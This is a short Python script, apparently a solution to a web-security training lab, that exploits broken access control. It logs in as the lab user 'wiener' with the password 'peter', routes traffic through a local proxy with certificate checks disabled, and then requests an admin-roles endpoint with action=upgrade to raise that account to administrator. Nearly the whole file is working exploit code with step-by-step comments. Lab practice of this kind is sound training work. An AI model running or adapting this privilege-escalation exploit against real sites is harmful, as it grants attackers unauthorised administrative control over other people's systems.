import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def prompt_to_admin(s,url):
    #login as the user wiener
    login_url=url+"/login"
    #next we need the data that was used to login
    data_login={'username':'wiener','password':'peter'}
    #now next step is to perform the request we can see that there is a POST request
    r=s.post(login_url,data=data_login,verify=False,proxies=proxies)
    #now I am gonna set the response of the request of the parameter res

    res=r.text
    if "Log out"  in res:
        print("(+) Successfully logged in as the user wiener")
        
        #if we successfully login then further we can exploit the lab 
        #exploit access control to prompt user to admin
        
        admin_roles_url=url + "/admin-roles?username=wiener&action=upgrade"
        r=s.get(admin_roles_url,verify=False,proxies=proxies)
        res=r.text
        if "Admin panel" in res:
            print("(+)Successfully prompted the user to admin panel")
        else:
            print("(-)Could not prompt the user to admin")    
            sys.exit(-1)
        
    else:
        print("(-)Could not logged in as the user wiener")    
        sys.exit(-1) #ending the program because if we can't logged in then we definitely can't 

    

def main():
    if len(sys.argv)!=2:
        print("(+)Usage %s <url>" % sys.argv[0])
        print("(+)Example %s www.example.com" % sys.argv[0])

    else:
        s=requests.Session()    
        url=sys.argv[1]
        prompt_to_admin(s,url) #it is responsibel to prompt the user to admin and get access to bac
        
        


    


if __name__=="__main__":
    main()




